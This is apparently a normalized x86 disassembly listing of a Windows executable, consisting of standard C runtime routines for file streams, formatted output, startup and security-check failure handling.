pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x1
push ebx
push eax
call sub_40fd9c
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rwxdata ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_40fd9c
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_40fd9c
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_40bea9
push 0xc
push r--data
call sub_40e30c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_40bd0c
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bf0d
mov eax [ ebp - 0x1c ]
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_40e351
retn
sub_40bf17
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40f52e
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_40bd0c
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40f4fc
pop ecx
push eax
call sub_40fd9c
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_40bfa1
push 0xc
push r--data
call sub_40e30c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bf17
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c01c
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_40e351
retn
cmp edi 0x2
jne r-xdata
sub_40c026
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_40d7cc
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_40f52e
push esi
mov ebx eax
call sub_41006f
push esi
call sub_40f4fc
push eax
call sub_40ffa2
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_40fe78
pop ecx
mov [ esi + 0x1c ] edi
sub_40c09d
push 0xc
push r--data
call sub_40e30c
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_40c026
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c111
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_40e351
retn
mov eax [ ebp - 0x1c ]
sub_40c119
push 0xc
push r--data
call sub_40e30c
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_40f4fc
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_40e351
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c215
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rwxdata
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_4100a0
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rwxdata ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rwxdata
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_40c21d
push 0xc
push r--data
call sub_40e30c
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_40f4fc
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_40e351
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c319
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rwxdata
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_4100a0
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rwxdata ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rwxdata
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_40c321
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_4100a0
pop ecx
pop ebp
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
pop ebp
retn
sub_40c341
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push rwxdata
adc ecx 0xfe624e21
push ecx
push eax
call sub_4101d0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_40c3b8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_410371
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4105d7
pop ecx
sub_40c3fc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4107e9
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_41090e
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rwxdata ] 0x1
mov esi rwxdata
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_40c3df
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_410936
int3
or [ rwxdata ] 0x1
mov ecx esi
call sub_40c392
push sub_429c6c
call sub_410709
pop ecx
sub_40c4d1
push 0x58
push r--data
call sub_40e30c
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_40eb60
test eax eax
jne r-xdata
push 0x1c
call sub_40c461
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_41163e
mov [ ebp - 0x4 ] ebx
call sub_40fa85
test eax eax
jge r-xdata
push 0x10
call sub_40c461
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rwxdata ] eax
call sub_411507
mov [ rwxdata ] eax
call sub_41144c
test eax eax
jge r-xdata
push 0x1b
call sub_410a02
pop ecx
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_4111c5
test eax eax
jge r-xdata
push 0x8
call sub_410a02
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_41168e
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_410b39
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_410a02
pop ecx
call sub_411166
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_410a02
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_410d16
mov [ ebp - 0x4 ] edi
jmp sub_40c631
push eax
call sub_410cea
push ecx
push eax
push esi
push __dos_header
call sub_40b3b0
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
sub_40c659
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] edx
mov [ rwxdata ] ebx
mov [ rwxdata ] esi
mov [ rwxdata ] edi
mov [ rwxdata ] ss
mov [ rwxdata ] cs
mov [ rwxdata ] ds
mov [ rwxdata ] es
mov [ rwxdata ] fs
mov [ rwxdata ] gs
pushfd
pop [ rwxdata ]
mov eax [ ebp ]
mov [ rwxdata ] eax
mov eax [ ebp + 0x4 ]
mov [ rwxdata ] eax
lea eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x320 ]
mov [ rwxdata ] 0x10001
mov eax [ rwxdata ]
mov [ rwxdata ] eax
mov [ rwxdata ] 0xc0000409
mov [ rwxdata ] 0x1
mov eax [ rwxdata ]
mov [ ebp - 0x328 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rwxdata ] eax
push 0x1
call sub_4117ce
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rwxdata ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_4117ce
pop ecx
sub_40c75f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40f4fc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_40d7cc
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_40d7cc
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_40dd54
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40f420
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_4119bd
pop ecx
test eax eax
jne r-xdata
call sub_40dd54
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_40f420
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_411974
pop ecx
pop edi
mov eax rwxdata
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_41185b
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rwxdata ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40c8c3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40e99d
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rwxdata ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rwxdata ]
je r-xdata
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_412423
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_411c47
mov [ esi + 0x4 ] eax
sub_40c95b
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40c75f
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_40c98e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_40c95b
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_40c9b4
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_40c95b
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_40d7cc
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_40c95b
sub_40ca3b
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_40c8c3
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_40f4fc
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_40d5e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_413d20
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_4117ce
pop ecx
sub_40d70a
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
call sub_40e714
push [ ebp + 0x8 ]
mov esi eax
call sub_40e699
pop ecx
pop ecx
mov [ rwxdata ] eax
mov eax esi
pop esi
pop ebp
retn
sub_40d749
mov edi edi
push ebp
mov ebp esp
push [ rwxdata ]
call sub_40e714
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_4117ce
pop ecx
pop ebp
jmp sub_40d5e2
pop ebp
jmp eax
sub_40d78a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rwxdata ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rwxdata ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40d7f2
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40d7df
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_40d78a
pop ecx
mov esi eax
call sub_40d7cc
mov [ eax ] esi
pop esi
pop ebp
retn
sub_40d815
mov edi edi
push ebp
mov ebp esp
call sub_40e924
test eax eax
jne r-xdata
call sub_40d7cc
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_40d836
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
call sub_40d7cc
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40d865
mov edi edi
push ebp
mov ebp esp
call sub_40e924
test eax eax
jne r-xdata
call sub_40d7df
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_40d886
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
call sub_40d7df
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40d8b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_40ca3b
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40c75f
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40d94d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_40da16
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
